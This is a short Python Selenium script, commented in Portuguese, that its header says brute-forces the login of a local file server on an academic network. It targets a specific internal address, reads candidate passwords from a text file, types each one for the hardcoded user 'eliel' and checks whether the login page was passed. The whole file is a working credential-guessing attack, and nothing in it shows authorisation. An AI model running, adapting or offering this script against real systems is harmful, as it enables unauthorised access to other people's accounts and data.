# Função - Fazer um brute force no File Server Local da rede Academica.

from selenium import webdriver
from time import sleep

driver = webdriver.Chrome(
    'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chromedriver.exe')


class Brute_Force:
    def __init__(self, driver):
        self.driver = driver
        self.url = 'http://10.38.0.5:1080/login?redirect=%2F'

    def go_to_page(self):
        self.driver.get(self.url)
        sleep(3)

    def brute_force(self):

        # Varre o arquivo txt pegando as senhas.
        self.senhas = open('senhas.txt', 'r')

        for senha in self.senhas:
            try:
                # Verifica se passou da pagina de Login.
                if driver.current_url != 'http://10.38.0.5:1080/login?redirect=%2F':
                    exit()

                # Preenche o campo com o usuario especificado
                self.user_form = driver.find_element_by_xpath(
                    "//div[@id='login']/form/input")
                self.user_form.send_keys('eliel')
                sleep(2)

                # Preenche o campo com as senhas da lista.
                self.pass_form = driver.find_element_by_xpath(
                    "//input[@type='password']")

                for letra in senha:
                    self.pass_form.send_keys(letra)
                    sleep(0.5)

                # Clica no botão de login/enviar
                self.submitt = driver.find_element_by_xpath(
                    "//div[@id='login']/form/input[3]")
                self.submitt.click()
                sleep(2)
                self.driver.refresh()
                sleep(2)

            except:
                print('O processo terminou!, veja se conseguiu acesso.')
                print(f'A ultima senha testada foi {senha}')
                exit()


# Instanciando os Objetos
Chrome = Brute_Force(driver)
Chrome.go_to_page()
Chrome.brute_force()
